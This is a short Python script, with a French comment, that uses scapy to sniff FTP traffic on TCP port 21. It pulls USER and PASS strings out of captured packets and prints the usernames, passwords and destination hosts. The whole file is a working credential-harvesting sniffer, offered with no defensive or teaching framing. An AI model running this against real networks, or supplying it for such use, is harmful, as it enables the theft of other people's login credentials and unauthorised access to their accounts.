from scapy.all import *

# Programme qui permet de capturer les paquets FTP qui passent sur le reseau et qui recupere les informations de connexion (user, pass)

def ftpsniff(pkt):
    dest = pkt.getlayer(IP).dst
    raw = pkt.sprintf('%Raw.load%')
    user = re.findall('(?i)USER (.*)', raw)
    pswd = re.findall('(?i)PASS (.*)', raw)
    if user:
        print('[*] FTP Login to ' + str(dest))
        print('[+] User account: ' + str(user[0]))
    elif pswd:
        print('[+] Password: ' + str(pswd[0]))

sniff(filter='tcp port 21', prn=ftpsniff)